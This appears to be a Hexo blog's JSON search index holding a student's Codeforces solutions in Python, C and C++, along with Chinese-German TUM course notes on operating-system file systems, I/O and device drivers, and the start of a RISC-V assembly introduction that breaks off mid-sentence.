{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-03-03T17:50:25.350Z","updated":"2025-03-03T17:50:25.350Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"CTF萌新"},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"友链","date":"2025-03-09T23:52:24.022Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Codeforce-Bit++","slug":"ACM/Codeforce/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-03-25T18:24:10.723Z","comments":true,"path":"2025/03/25/ACM/Codeforce/Codeforce-Bit/","permalink":"http://example.com/2025/03/25/ACM/Codeforce/Codeforce-Bit/","excerpt":"","text":"题目描述 思路对于每一行命令检测+是否在里面就好。 代码Python123456789n = int(input())x=0for _ in range(n): op = input() if &quot;+&quot; in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; int n, x = 0; scanf(&quot;%d&quot;, &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) &#123; scanf(&quot;%s&quot;, op); if (strchr(op, &#x27;+&#x27;)) &#123; x += 1; &#125; else &#123; x -= 1; &#125; &#125; printf(&quot;%d\\n&quot;, x); return 0;&#125; CPP","categories":[],"tags":[]},{"title":"Codeforce - Team","slug":"ACM/Codeforce/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-03-25T17:46:56.034Z","comments":true,"path":"2025/03/25/ACM/Codeforce/Codeforce-Team/","permalink":"http://example.com/2025/03/25/ACM/Codeforce/Codeforce-Team/","excerpt":"","text":"题目描述 一共有 n 道题目，而对于每道题，他们会选择是否去做这题：只有当三个人中至少有两个人对这题有把握时，他们才会决定去做。 思路直接计算每行的和是否大于等于2。 代码Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} CPP123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main() { int n, a, b, c; int count = 0; cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if (a + b + c &gt;= 2) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;}","categories":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/categories/ACM/"},{"name":"Codeforce","slug":"ACM/Codeforce","permalink":"http://example.com/categories/ACM/Codeforce/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/tags/ACM/"}]},{"title":"Codeforce - Way Too Long Words 题解","slug":"ACM/Codeforce/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-03-25T17:41:36.553Z","comments":true,"path":"2025/03/25/ACM/Codeforce/Codeforce-A-Way-Too-Long-Words/","permalink":"http://example.com/2025/03/25/ACM/Codeforce/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"题目描述 简单来讲就是需要”简化“长单词。 思路先判断单词长度。如果小于等于10就不用管，如果超过10，则写成：首字母 + 中间的字母数量 + 末尾字母。 代码Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} CPP12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/categories/ACM/"},{"name":"Codeforce","slug":"ACM/Codeforce","permalink":"http://example.com/categories/ACM/Codeforce/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://example.com/tags/ACM/"}]},{"title":"GBS 7 Dateisystem 文件系统","slug":"TUM笔记/GBS/GBS-7-Dateisystem-文件系统","date":"2025-03-24T20:53:38.000Z","updated":"2025-03-25T08:52:59.932Z","comments":true,"path":"2025/03/24/TUM笔记/GBS/GBS-7-Dateisystem-文件系统/","permalink":"http://example.com/2025/03/24/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"操作系统基础相关笔记","text":"Einführung首先我们需要先明确为什么需要文件系统： 进程在运行期间只能使用其虚拟地址空间来存储数据：容量有限。 当进程结束时，其虚拟地址空间中的数据会丢失：无法实现持久的、长期的数据存储。 在虚拟进程地址空间中存储数据只允许有限的共享访问：不能实现同时并行使用。 所以我们需要文件系统来提供更高级别，更持久、更可靠并且可共享的数据存储功能。 也就意味着我们会对文件系统有着以下要求： 提供存储空间以容纳大量数据（Speicherplatz für (sehr) große Datenmengen bereitstellen） 防止数据丢失（Datenverlust vermeiden） 支持并发访问数据（Nebenläufigen Zugriff auf Daten ermöglichen） 多个进程应能够同时访问数据。 文件系统的基本作用是将硬盘上的原始数据块组织成结构良好的文件，使得用户和程序可以方便地存取数据。 具体的任务包括： 可以描述文件的数据结构（Datenstrukturen zur Beschreibung von Dateien） 实现文件（Implementierung der Dateien） 命名（Benennung） 允许访问文件（Zugriffe auf Dateien ermöglichen） 防止未授权访问（Schutz vor unberechtigten Zugriffen） 常见的文件系统有： FAT-16&#x2F;32 (DOS) 老式的微软文件系统 NTFS (Windows NT) 微软当前主流的文件系统 Ext2&#x2F;3&#x2F;4 (Linux) Linux 系统中广泛使用的文件系统系列（Ext4是目前主流） 硬盘硬盘作为长期存储的媒介，可以被看作是一串固定大小的线性数据块序列（ eine lineare Sequenz von Blöcken fester Größe ）。这里的块（Block）就是硬盘读写的基本单位（Einheit）。这里的块的大小是由操作系统决定的，和硬盘的sector没有直接的大小关系。 而为了更好的管理硬盘的存储空间，我们需要操作系统对硬盘属性进行虚拟化，也就是所谓的文件概念（Datei-Konzept）： 文件是逻辑上的管理单元。（Dateien sind logische Verwaltungs-Einheiten） 文件可以持久地存储任意信息。（Dateien speichern beliebige Informationen persistent (dauerhaft)） 文件系统对块的存储位置、空闲状态等进行了抽象处理。（Datei abstrahiert davon, wo die Blöcke gespeichert sind, welche Blöcke frei sind usw.） 进程可以通过系统调用来创建、写入、读取和删除文件。（erstellen, schreiben, lesen, löschen） 文件不仅被用户程序使用，也被系统软件使用。（ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendet） 文件 （Dateien）例子Linux的ext2Linux的ext4","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme, Operating System, 操作系统, 文件系统","slug":"Betriebssysteme-Operating-System-操作系统-文件系统","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe 输入/输出","slug":"TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出","date":"2025-03-20T19:20:11.000Z","updated":"2025-03-24T20:52:44.095Z","comments":true,"path":"2025/03/20/TUM笔记/GBS/GBS-8-Ein-Ausgabe-输入输出/","permalink":"http://example.com/2025/03/20/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"操作系统基础相关笔记","text":"[toc] 设备大致可以分为2类： 块设备（Blockorientierte Geräte，block devices）： 内容是可寻址的（adressierbar）； 数据以固定大小的块存储（in Blöcken fester Größe von 29 Byte bis 216 Byte）； 可以随机访问（Random Access）每个块； 例子：蓝光光盘（Blu-ray Disc）、硬盘（HDD）、固态硬盘（SSD）。 字符设备（Zeichenorientierte Geräte，character device）： 串行数据传输（serieller Datentransfer）：指每次传输一个比特数据，并连续进行以上单次过程的通信方式； 不可寻址的； 发送和&#x2F;或接收字符流（Zeichenströme）； 例子：鼠标，键盘，打印机。 （其他）： 比如说时钟（生成中断信号 erzeugt Unterbrechungen），显示器等。 拿键盘举例，我们每次敲击按键了之后它都会将这个信息直接传输到电脑，而不是等我们输入了一长串内容之后再将这段内容一起发送给电脑，所以是serieller Datentransfer。而与serieller Datentransfer相对的则是parallele Datenübertragung。 E&#x2F;A System 的分层结构： 控制器（Controller）：设备硬件的一部分；作为CPU和设备之间的接口。 中断处理程序（Interrupt-Handler）：处理设备的反馈信息（中断）。 设备驱动程序（Gerätetreiber）：执行与设备相关的控制软件；驱动程序通过控制器访问设备。 设备无关软件（Geräteunabhängige Software）：分配设备、数据缓冲等功能。 用户级软件（User-Level-Software）：用于输入&#x2F;输出（E&#x2F;A）的库函数，例如假脱机（Spooling）。 以惠普（HP）打印机为例来明确一下每层的具体内容： 控制器：HP 打印机的主控制芯片 惠普打印机内部有专门的 控制芯片，负责管理打印作业、处理数据，并控制墨盒或激光成像单元的工作。 中断处理程序：负责处理打印机状态反馈（如“缺纸”或“墨盒不足”）的程序 当打印机遇到 缺纸、卡纸、墨水不足 等问题时，会发送中断信号给计算机，让操作系统暂停当前任务并处理异常。 设备驱动程序：HP 打印机驱动程序 点击“打印”时，驱动程序会把文本或图像转换成 HP 打印机能理解的格式（如 PCL、PostScript），然后发送给打印机。 设备无关软件：Windows&#x2F;Linux 的打印管理系统 这层软件不依赖于具体的打印机品牌，而是为所有打印设备提供统一的管理功能，如： 排队管理（多个打印任务排队执行） 数据缓冲（避免 CPU 直接等待打印机完成任务，提高效率） 用户级软件：用户直接使用的应用程序，它们调用系统级打印服务完成任务。例如：Microsoft Word，HP Smart App。 接下来我们看一下每一层的具体功能： 控制器（Controller）什么是控制器？ 输入&#x2F;输出设备（E&#x2F;A-Geräte） 由机械组件和电子组件组成，其中电子组件就是设**设备控制器（Geräte-Controller）**。它是连接 CPU 和外部设备的桥梁。 Controller besitzt Hardware-Schnittstelle zum Gerät. 控制器包含寄存器（Register），用于与 CPU 进行通信： 数据传输：操作系统（BS）向寄存器写入数据。 查询设备状态：操作系统 读取寄存器内容。 附加功能：控制器提供数据缓冲区（Datenpuffer），用于存储传输中的数据，以提高效率。 设备控制器（Geräte-Controller）的主要任务： 设备管理（Steuerung der beweglichen Hardware） 处理来自驱动的命令（Befehle ausführen） 与CPU进行交互（Kommunikation mit CPU） 发送中断信号（Interrupts melden） 缓冲数据（Daten puffern） 交互计算机与设备控制器（Controller）交互主要有两种方式： I&#x2F;O-Ports： 早期计算机使用 I&#x2F;O 指令和I&#x2F;O 端口与设备通信。 Memory-Mapped I&#x2F;O： 将设备的寄存器直接映射到系统内存地址空间，这样 CPU 可以通过普通的 LOAD&#x2F;STORE 指令来访问设备。 早期的计算机需要手动设置设备地址，使用 跳线（Jumper） 或 DIP 开关。而现代设备支持 Plug &amp; Play，系统能够自动分配 I&#x2F;O 端口地址 和 中断（IRQ）。 数据交换第一种方法： 程序控制 I&#x2F;O（Programmed I&#x2F;O）CPU会直接控制与设备的交互。 比如说向打印机发送数据需要进行以下步骤： 将数据复制到内核 内核逐个字符发送到打印机 传输字符 $N$ 等待打印机确认字符 $N$ 继续发送字符 $N+1$ 这样做的坏处非常显而易见：忙等待（Busy Waiting）。CPU会被卡死在这里不能完成其他的任务。 代码示例： 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // 忙等待 *printer_data_register = p[i]; // 只发送一个字符&#125; 更好的办法： 中断（Interrupts）流程如下： 设备通过信号通知CPU，表明其I&#x2F;O操作已完成。 中断控制器（Interrupt Controller Chip）识别信号，并通知CPU。 操作系统（BS）暂停当前进程，切换到内核模式（Kernel Mode）。 在内核中执行中断处理程序（Unterbrechungsbehandlungsroutine） 设备驱动程序（Gerätetreiber）负责提供中断处理程序（Unterbrechungsbehandlungsroutine），但中断处理的执行由操作系统管理。 中断处理程序（Handler） 执行完成后便会通知操作系统。 操作系统将等待（wartenden）I&#x2F;O 的进程恢复到可运行状态（rechenwillig）。 这个流程可以分为2部分： 同步系统调用（Systemcall） 传递 I&#x2F;O 参数，启动 I&#x2F;O 操作。 调用后，进程进入睡眠状态（等待 I&#x2F;O 完成），释放 CPU。 Interrupt-Handler 逐步处理 I&#x2F;O 操作。 I&#x2F;O 完成后，唤醒等待的进程。 代码示例： 1. Systemcall： 12345copy_from_user(buffer, p, count); // 从用户空间复制数据到内核enable_interrupts(); // 允许中断while (*printer_status_reg != READY); // 轮询等待打印机准备就绪*printer_data_register = p[0]; // 发送第一个字符到打印机scheduler(); // 调度其他进程 2. Interrupt-Handler： 123456789if (count == 0) &#123; unblock_user(); // 唤醒等待的进程&#125; else &#123; *printer_data_register = p[i]; // 发送下一个字符 count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // 确认中断已处理return_from_interrupt(); 用这个方法的话CPU 可在 I&#x2F;O 期间执行其他任务，不需要一直等待。但是会一直触发Interrupt，可能会影响性能。 所以此之上还有一种更好的办法： 直接内存访问（Direct Memory Access, DMA）使用 DMA 控制器，允许直接访问内存，而无需 CPU 介入。可以有效解决通过寄存器作为中间存储器传输数据消耗大量 CPU 计算周期的问题。 传输流程： CPU 初始化 DMA （Programmiert DMA-Register (Speicher- und Gerätadressen, Parameter)）； 磁盘控制器（ Disk-Controller）将数据放入缓冲区（Puffer）； DMA 控制器从磁盘（Disk）读取数据，并直接存入主存（RAM）（DMA-Controller initiiert die Übertragung von Disk in RAM）； 磁盘控制器（ Disk-Controller）发送确认（ACK）。 操作系统（BS）继续处理内存中的数据（ weiterverarbeiten bzw. weitergeben） 流程结束之后才会发送Interrupt。 之前是传输每个数据（每个字符）都会触发一次Interrupt，现在是传输整个数据块只会触发一次。 数据缓冲（Puffern von Daten）缓冲的主要作用是解耦（Entkopplung）用户程序和设备。相当于提供一个中间层。 （解耦指的是减少两个系统组件之间的直接依赖关系。） 缓存分以下几种类型： 无缓冲（Ohne Puffer）： 用户进程必须自己存储 I&#x2F;O 数据，并且数据必须始终驻留在进程的内存中，直到 I&#x2F;O 操作完成。 简单缓冲（Einfacher Puffer）： 进程仍然必须快速取走数据，否则缓冲区会满，影响数据流。 双缓冲（Doppelter Puffer）： 一个缓冲区正在被读取（geleert）的同时另一个缓冲区会正在被写入（gefüllt）。清空速度必须足够快，否则会导致数据堆积。 环形缓冲（Zirkulär / Ringpuffer）： 扩展双缓冲的概念，使用多个缓冲区（k 个缓冲区）。可以适应不同的负载和处理速度，提高数据吞吐率。 会使用2个指针来管理数据：写指针和读指针。 有时可能会存在多个级别的缓冲，比如说：Nutzerprozess, Kern, Gerätetreiber, Gerätecontroller, … 设备驱动程序（Geräte-Treiber）设备驱动程序（Geräte-Treiber，Device Driver） 是操作系统中用于控制硬件设备的软件模块（Software-Module）。它充当 BS 和设备（尤其是Controller）之间的桥梁，让系统能够识别和管理外部设备。 驱动具有以下特点： 针对特定设备类型（Gerätetyp-spezifisch） 它了解相应设备的指令集（即控制设备的命令），以便和controller进行交互。 一个驱动程序可适用于多个同类设备 比如说USB驱动会支持所有的USB设备。 驱动充当BS 和设备（尤其是Controller）之间的桥梁指的是它可以： 查询设备状态（Gerätezustand abfragen） 向设备发送命令（Befehle an das Gerät zu übermitteln） 与设备进行数据交换（Daten mit dem Gerät auszutauschen） 同样，驱动也可能存在子结构（Unterstruktur），比如说USB。 驱动的主要任务： 定义设备并向操作系统注册，并激活设备。（definiert das Gerät gegenüber dem BS, aktiviert das Gerät） 在系统启动时初始化控制器和设备。（initialisiert den Controller und das Gerät beim Systemstart） 转换I&#x2F;O 请求，使其变为设备可理解的指令。（wandelt E&#x2F;A-Anforderungen in gerätespezifische Befehle um） 响应（来自设备或控制器的）硬件信号。（antwortet auf Hardwaresignale des Geräts bzw. des Controllers）（比如说 Interrupt handling） 报告设备和控制器的错误（错误检测和日志记录）。（meldet Geräte- und Controller-Fehler） 传输设备与操作系统之间的数据和状态信息。（überträgt Daten und Zustandsinformation vom&#x2F;zum Gerät） 缓冲输入&#x2F;输出数据，优化数据传输性能。（提供Buffer）（puffert Daten bei Ein- und Ausgabe） 设备驱动是如何与设备控制器协作的？ 驱动程序发送命令到设备控制器，并在等待期间阻塞自身（防止 CPU 过度轮询）。（Treiber schickt Kommandos zum Controller und blockiert sich） 控制器处理数据并在传输完成后发送信号（通知数据交换已完成）。（Controller signalisiert das Ende des Datenaustausches） 中断处理程序（Interrupt-Handler）解除驱动的阻塞状态，例如通过信号量（Semaphore） 让进程恢复运行。（Der Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)） 驱动程序处理收到的数据或继续发送新数据。（Treiber verarbeitet empfangene Daten bzw. schickt weitere Daten） 设备无关的软件（Geräte-unabhängige Software）设备无关的软件的目的是简化驱动程序的编程（Vereinfachte Treiber-Programmierung），并便于集成新的驱动程序软件（Einfache Einbindung neuer Treiber-Software）。 设备无关软件的主要任务： 在设备驱动程序和操作系统之间建立标准接口。（Bereitstellung einer einheitlichen Schnittstelle zwischen Gerätetreibern und dem Rest des Betriebssystems） 缓冲 如果缓冲不由驱动管理，则由设备无关的软件负责。 错误处理（Fehlerbehandlung） 除了驱动程序本身的错误处理外，还提供额外的错误管理机制。 设置设备无关的参数（Festlegung geräteunabhängiger Parameter） 比如说块设备（Blockgerät）使用的块大小（Blockgröße） 用户级软件（User-Level-Software）系统库（Systembibliothek）通常会直接给用户提供E&#x2F;A的编程接口。 比如说： open()： 打开设备的逻辑通道，返回一个 文件描述符（Descriptor 或 Handle），供后续操作使用。 read()： 从设备读取数据，返回指定数量的字节流（Bytestream）。 close()： 关闭先前打开的通道，释放相关的系统资源。 write()： 向设备写入数据，发送指定数量的字节到设备。 ioctl()： 改变设备的操作模式，比如调整串行端口的传输速率或者是修改设备的控制参数 除了这些标准库函数，还有： 假脱机（Spooling）由于在现实生活中，我们经常会有多个进程同时提交I&#x2F;O请求，比如说用一台打印机打印多份文件。这个时候就需要想办法协调资源的使用，避免出现冲突。 什么是 Spooling？ Spooling（Simultaneous Peripheral Operations Online，同步外设操作） 是一种用于管理**独占（）exklusiv nutzbar)**设备（如打印机）访问的缓冲机制。 在这个机制下，进程不会直接访问设备，而是将任务交给 Spooler Daemon（假脱机守护进程） 处理。只有 Spooler Daemon 会直接与设备驱动程序交互，确保设备顺序执行任务。用户进程的任务先存入 Spooling 目录（缓冲区），然后按顺序执行。 UNIX&#x2F;Linux里的设备管理在UNIX&#x2F;Linux里，我们需要通过文件系统访问 I&#x2F;O 设备（因为“Everything is a file”）： 在访问设备前，必须先打开它 open。 不同设备支持额外的文件系统操作，如读写、状态查询等。 设备管理位于 /dev 目录，所有设备文件都存放在这里。 设备状态查询和配置可能位于 /proc 目录。 设备文件名称指示设备类型，比如说： /dev/tty0：物理串行接口（终端）。 /dev/USBtty1：抽象串行接口（USB 串口设备）。 /dev/sd0：硬盘设备（`sd` 代表 SCSI 磁盘）。 /dev/null：伪设备，写入的数据会被丢弃。 /dev/zero：伪设备，读取时返回无限的 0 字节。 Spooling 任务存储在 /var/spool 目录下，其中 lpq：打印任务队列（打印机 Spooling）。 mqueue：邮件服务器的发送队列（邮件 Spooling）。 news：新闻系统消息队列（新闻 Spooling）。 cron：定时任务执行队列（任务调度 Spooling）。 而设备的真正标识存储在 i-Node 中。i-Node会包含： 主设备号（Major Device Number）：标识设备驱动程序（决定设备的驱动）。 次设备号（Minor Device Number）：要访问的具体设备。 设备例子（机械）硬盘（Festplatten，HDD）机械硬盘属于Block-Gerät，有着以下构造： 同心圆柱（Konzentrische Zylinder） 堆叠的磁盘盘片（Platten, k 层），每张盘片的两面都可以读写（2k 面）。 每张盘片上有多个磁道（Tracks），磁道的编号取决于 圆柱、盘片和面（Track &#x3D; f(Zylinder, Platte, Seite)）。 每个磁道由多个扇区（Sektoren）组成，每个扇区大小为 512 字节。不过靠近磁盘中心的区域可能有更少的扇区（由于圆周较小）。 机械读写磁头（Schreib-&#x2F;Leseköpfe），每个盘片有两个读写磁头（上下各一个），总数为 2k。 构造图示： 早期会用到3个参数来确定需要读写的具体位置： x Zylindernummer，Radius：确定是哪一个环； y Kopfnummer，Höhe：确定是哪一张盘片的哪一面； z Sektornummer pro Winkel：确定是哪个扇面； 由于早期 BIOS 和文件系统的设计的限制，只能访问有限的区域。 所以现在一般都使用线性逻辑地址（lineare Adressierung logischer Blöcke），即给每个Sector编号（0，1，2，3，…）。 一个Sector里会包含以下信息： 前导信息（Präambel）： 包含同步位、磁道号和扇区号 数据（Daten）： 通常为512字节 错误校正码（ECC）： Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. 控制器通常一次读取整个磁道，这会需要足够的缓存来存储数据。但假如没有足够的缓存，则会采用交错的格式（ Formatierung mit Interleaving）：扇区不会按顺序排列的：1, 2, 3, 4, 5, 6, …, 15，而是交错排列的：1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15。这样子可以确保读取某个扇区 N ，将数据传输到主存后，扇区 N+1 会刚好移动到读写头下方，不需要再多等一圈。（因为磁盘好像是会一直转的） 为了避免磁盘损坏影响硬盘功能，会使用RAIS-System。（详细内容见数据库的笔记） 读写磁头找到所需Sector的策略分3种： FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) 固态硬盘（SSD）SSD的全称为Solid State Drives，主要基于 (NAND) 闪存。 SSD的一些特点： 无机械部件（Keine beweglichen Teile） 所以不会有机械磨损及其导致的故障，更耐振动、冲击等，访问速度更快。 仍然可能出现故障（Fehlfunktionen auch hier möglich），比如 坏块，存储芯片故障（Bad blocks, Fehler in Speicherchips） 反复读取可能影响相邻存储单元 故障可能导致整个 SSD 无法读取 数据恢复更加复杂 闪存写入次数有限（Flash-Speicher nur begrenzt oft schreibbar） 读取比写入快，顺序（sequentiell）写入比随机写入快 SSD的基本工作原理SSD的初始状态是： 111111111 11111111 11111111 ... 写入的话会将1改成0： 101000111 01000010 01010011 ... 但如果想修改的话，不能只是修改一位，而是需要将这一整块重置然后再写入。 写入的大小最低为4KB，删除的大小最低为256KB，所以会导致所谓的**写入放大（Write Amplification）**的问题。 解决方式：这部分我没看懂，等看懂了再写。 时钟（Uhr,）时钟会持续性计时。 硬件时钟（Hardware-Uhr (Chip)）的构成： Quarz als Taktgeber： 石英晶体”作为时钟信号源，用来产生稳定的振荡信号（周期性电信号）作为“节拍”。 计数器（Zähler）： 每个时钟节拍到来时，计数器的值会减1（dekrementiert）； 当计数器值减到0时，就会触发一个中断（Interrupt）。 Register zum (wiederholten) Setzen des Zählers auf einen Startwert： 可以通过软件来控制Interrupt的频率。 时钟&#x2F;定时器的任务： 管理时间和日期（Tageszeit und Datum verwalten） 中断和切换进程（调度）（Prozesse unterbrechen und umschalten (Scheduling)） 测量某个进程的计算时间消耗（Rechenzeitverbrauch eines Prozesses messen） 向应用程序提供定时器功能（ Zeitschaltuhren den Anwendungen zur Verfügung stellen） 功能监控（看门狗定时器）（Funktionsfähigkeitsüberwachung (watchdog timer)） 性能分析、监控、统计（Profiling, Monitoring, Statistik） 可以用链表的数据结构来管理定时事件： 所有时间均为相对时间（relativen Zeiten），也就是说每个节点的值代表相对于前一个事件的延迟（以 tick 为单位）。 定时器（Timer）Timer（定时器）确实通常分为两种类型： 硬件定时器（Hardware Timer）： 系统通常有第二个可编程定时器。它在到时间的时候会触发Interrupt。但Interrupt的代价有点高，因为会引发上下文切换，并且可能会干扰程序正常运行。 软件定时器（Software Timer）： 这个的想法是只在系统处于内核态时检查定时器状态（nur dann aktiv werden, wenn System im Kernel-Mode ist），这样一来就不需要额外的上下文切换。在从内核模式切换到用户模式之前，操作系统读取实时时钟并检查是否有软件定时器已经超时，如有需要，处理相应的事件。 它的缺点也很明显，就是延迟，不过大部分情况下都是可以接受的。 终端（Terminals）终端是如何通过驱动程序将用户输入&#x2F;输出转化为系统能够理解的数据流的： 上层：提供一个统一接口给操作系统的输入&#x2F;输出子系统（Einheitliche Schnittstelle zum E&#x2F;A-Subsystem des BS） 中层：解析输入和构造输出内容（Bearbeitungsmodul für Ein- und Ausgaben） 下层：与不同的物理硬件设备直接对应（Abbildung verschiedene physische Geräte），比如鼠标、显卡。 系统中的 terminal 是一个底层的字符设备机制，管理输入输出流、进程控制和驱动之间的协作。而我们平常用的cmd只是是 terminal的一种表现形式。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"http://example.com/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme, Operating System, 操作系统, 输入/输出","slug":"Betriebssysteme-Operating-System-操作系统-输入-输出","permalink":"http://example.com/tags/Betriebssysteme-Operating-System-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V 汇编语言入门","slug":"TUM笔记/ERA/RISC-V-汇编语言入门","date":"2025-03-19T19:56:10.000Z","updated":"2025-03-24T15:32:30.955Z","comments":true,"path":"2025/03/19/TUM笔记/ERA/RISC-V-汇编语言入门/","permalink":"http://example.com/2025/03/19/TUM%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"计算机体系结构基础相关笔记","text":"[toc] RISC-V 寄存器在 RISC-V 中，所有操作数（Operanden）都存储在寄存器中。 RISC-V ISA 拥有 32 或 33 个（可见）寄存器，其中x0永远为零，而x1 到 x31 是通用整数寄存器，f1 到 f31 是 浮点寄存器： Register ABI Name Description Saver x0 zero Hard-wired zero — x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer — x4 tp Thread pointer — x5–7 t0–2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10–11 a0–1 Function arguments/return values Caller x12–17 a2–7 Function arguments Caller x18–27 s2–11 Saved registers Callee x28–31 t3–6 Temporaries Caller Register ABI Name Description Saver f0–7 ft0–7 FP temporaries Caller f8–9 fs0–1 FP saved registers Callee f10–11 fa0–1 FP arguments/return values Caller f12–17 fa2–7 FP arguments Caller f18–27 fs2–11 FP saved registers Callee f28–31 ft8–11 FP temporaries Caller 这里第一列的是每个寄存器的编号，而第二列则是附带语义的名字。一般在汇编代码中使用ABI name，便于理解和维护。 关于Saver部分可以看下面这个表，会更直观一点： Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No Caller指的是调用函数的一方（比如说main()），而Callee指的则是被调用的函数。 如果一个register的Saver是Caller，则调用函数的一方（Caller）需要在调用函数前将这些寄存器里的值都存储好，以便被调用函数可以随意使用； 如果一个register的Saver是Callee，则被调用函数需要确保这些寄存器的值在该函数结束后与之前一模一样。 通俗一点来讲，前者是将自己的笔记本备份好之后借出去，借用方（Callee）可以随意使用；后者则是将笔记本借出去，但借用方必须确保拿到的时候是什么样子的还回去的时候也得是什么样子的。 RISC-V 汇编语言每一个ISA（Instruction Set Architecture）的指令都可以分为以下3大类： 算术和逻辑运算（Arithmetische und logische Operationen） 数据传输（Datentransfer） 程序控制 （Steuerung des Programmablaufs）：跳转和子程序调用（ Sprünge und Unterprogrammaufrufe） RISC-V 汇编指令一览： 算术 Arithmetik加法： a = b + c 1add a,b,c 减法： a = b - c 1sub a,b,c 组合： a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d 浮点数的情况： “f” 用于 Single Precision (32bit) Gleitkomma； “d” 用于 Double Precision (64bit) Gleitkomma。 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c 乘法的话基本上就是以下几种： 只不过RISC-V 的基本整数指令集中（RV32I 